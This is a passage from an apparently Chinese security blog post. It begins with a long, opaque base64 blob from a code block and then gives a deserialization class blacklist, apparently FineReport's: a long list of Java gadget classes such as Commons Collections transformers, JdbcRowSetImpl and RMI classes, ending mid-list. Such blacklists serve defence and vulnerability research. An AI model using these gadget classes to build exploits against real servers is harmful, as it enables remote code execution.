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</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306164147580.png" alt="image-20240306164147580"></th>
</tr>
</thead>
</table>
<h3 id="反序列化类黑名单"><a href="#反序列化类黑名单" class="headerlink" title="反序列化类黑名单"></a>反序列化类黑名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bsh.XThis</span><br><span class="line">bsh.Interpreter</span><br><span class="line">com.mchange.v2.c3p0.PoolBackedDataSource</span><br><span class="line">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</span><br><span class="line">clojure.lang.PersistentArrayMap</span><br><span class="line">clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a</span><br><span class="line">org.apache.commons.beanutils.BeanComparator</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer</span><br><span class="line">org.apache.commons.collections.functors.ConstantTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections.map.LazyMap</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry</span><br><span class="line">org.apache.commons.collections.map.TransformedMap</span><br><span class="line">org.apache.commons.collections.functors.MapTransformer</span><br><span class="line">org.apache.commons.collections.comparators.TransformingComparator</span><br><span class="line">org.apache.commons.collections4.Transformer</span><br><span class="line">org.apache.commons.collections4.comparators.TransformingComparator</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.ChainedTransformer</span><br><span class="line">org.apache.commons.collections4.functors.ConstantTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.map.LazyMap</span><br><span class="line">org.apache.commons.collections4.keyvalue.TiedMapEntry</span><br><span class="line">org.apache.commons.collections4.map.TransformedMap</span><br><span class="line">org.apache.commons.collections4.functors.MapTransformer</span><br><span class="line">org.apache.commons.fileupload.disk.DiskFileItem</span><br><span class="line">org.apache.commons.io.output.DeferredFileOutputStream</span><br><span class="line">org.apache.commons.io.output.ThresholdingOutputStream</span><br><span class="line">com.fr.third.org.apache.commons.beanutils.BeanComparator</span><br><span class="line">com.fr.third.org.apache.commons.collections.Transformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.comparators.TransformingComparator</span><br><span class="line">com.fr.third.org.apache.commons.collections.functors.ChainedTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.functors.ConstantTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.map.LazyMap</span><br><span class="line">com.fr.third.org.apache.commons.collections.functors.MapTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections.keyvalue.TiedMapEntry</span><br><span class="line">com.fr.third.org.org.apache.commons.collections.map.TransformedMap</span><br><span class="line">com.fr.third.org.apache.commons.collections4.comparators.TransformingComparator</span><br><span class="line">com.fr.third.org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections4.functors.ChainedTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections4.functors.ConstantTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections4.keyvalue.TiedMapEntry</span><br><span class="line">com.fr.third.org.org.apache.commons.collections4.map.TransformedMap</span><br><span class="line">com.fr.third.org.apache.commons.collections4.map.LazyMap</span><br><span class="line">com.fr.third.org.apache.commons.collections4.functors.MapTransformer</span><br><span class="line">com.fr.third.org.apache.commons.collections4.Transformer</span><br><span class="line">com.fr.third.org.apache.commons.fileupload.disk.DiskFileItem</span><br><span class="line">com.fr.third.org.apache.commons.io.output.DeferredFileOutputStream</span><br><span class="line">com.fr.third.org.apache.commons.io.output.ThresholdingOutputStream</span><br><span class="line">org.apache.wicket.util.upload.DiskFileItem</span><br><span class="line">org.apache.wicket.util.io.DeferredFileOutputStream</span><br><span class="line">org.apache.wicket.util.io.ThresholdingOutputStream</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.hibernate.engine.spi.TypedValue</span><br><span class="line">org.hibernate.tuple.component.AbstractComponentTuplizer</span><br><span class="line">org.hibernate.tuple.component.PojoComponentTuplizer</span><br><span class="line">org.hibernate.type.AbstractType</span><br><span class="line">org.hibernate.type.ComponentType</span><br><span class="line">org.hibernate.type.Type</span><br><span class="line">org.hibernate.EntityMode</span><br><span class="line">com.fr.third.org.hibernate.engine.spi.TypedValue</span><br><span class="line">com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer</span><br><span class="line">com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer</span><br><span class="line">com.fr.third.org.hibernate.type.AbstractType</span><br><span class="line">com.fr.third.org.hibernate.type.ComponentType</span><br><span class="line">com.fr.third.org.hibernate.type.Type</span><br><span class="line">com.fr.third.org.hibernate.EntityMode</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">org.jboss.interceptor.builder.InterceptionModelBuilder</span><br><span class="line">org.jboss.interceptor.builder.MethodReference</span><br><span class="line">org.jboss.interceptor.proxy.DefaultInvocationContextFactory</span><br><span class="line">org.jboss.interceptor.proxy.InterceptorMethodHandler</span><br><span class="line">org.jboss.interceptor.reader.ClassMetadataInterceptorReference</span><br><span class="line">org.jboss.interceptor.reader.DefaultMethodMetadata</span><br><span class="line">org.jboss.interceptor.reader.ReflectiveClassMetadata</span><br><span class="line">org.jboss.interceptor.reader.SimpleInterceptorMetadata</span><br><span class="line">org.jboss.interceptor.spi.instance.InterceptorInstantiator</span><br><span class="line">org.jboss.interceptor.spi.metadata.InterceptorReference</span><br><span class="line">org.jboss.interceptor.spi.metadata.MethodMetadata</span><br><span class="line">org.jboss.interceptor.spi.model.InterceptionType</span><br><span class="line">org.jboss.interceptor.spi.model.InterceptionModel</span><br><span class="line">sun.rmi.server.UnicastRef</span><br><span class="line">sun.rmi.transport.LiveRef</span><br><span class="line">sun.rmi.transport.tcp.TCPEndpoint</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">java.rmi.server.RemoteRef</span><br><span class="line">java.rmi.server.ObjID</span><br><span class="line">java.rmi.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.rmi.registry.Registry</span><br><span class="line">sun.rmi.server.ActivationGroupImpl</span><br><span class="line">sun.rmi.server.UnicastServerRef</span><br><span class="line">org.springframework.aop.framework.AdvisedSupport</span><br><span class="line">net.sf.json.JSONObject</span><br><span class="line">javax.xml.transform.Templates</span><br><span class="line">org.jboss.weld.interceptor.builder.InterceptionModelBuilder</span><br><span class="line">org.jboss.weld.interceptor.builder.MethodReference</span><br><span class="line">org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory</span><br><span class="line">org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</span><br><span class="line">org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference</span><br><span class="line">org.jboss.weld.interceptor.reader.DefaultMethodMetadata</span><br><span class="line">org.jboss.weld.interceptor.reader.ReflectiveClassMetadata</span><br><span class="line">org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata</span><br><span class="line">org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator</span><br><span class="line">org.jboss.weld.interceptor.spi.metadata.InterceptorReference</span><br><span class="line">org.jboss.weld.interceptor.spi.metadata.MethodMetadata</span><br><span class="line">org.jboss.weld.interceptor.spi.model.InterceptionModel</span><br><span class="line">org.jboss.weld.interceptor.spi.model.InterceptionType</span><br><span class="line">org.python.core.PyObject</span><br><span class="line">org.python.core.PyBytecode</span><br><span class="line">org.python.core.PyFunction</span><br><span class="line">org.apache.myfaces.context.servlet.FacesContextImpl</span><br><span class="line">org.apache.myfaces.context.servlet.FacesContextImplBase</span><br><span class="line">org.apache.myfaces.el.CompositeELResolver</span><br><span class="line">org.apache.myfaces.el.unified.FacesELContext</span><br><span class="line">org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</span><br><span class="line">com.sun.syndication.feed.impl.ObjectBean</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span 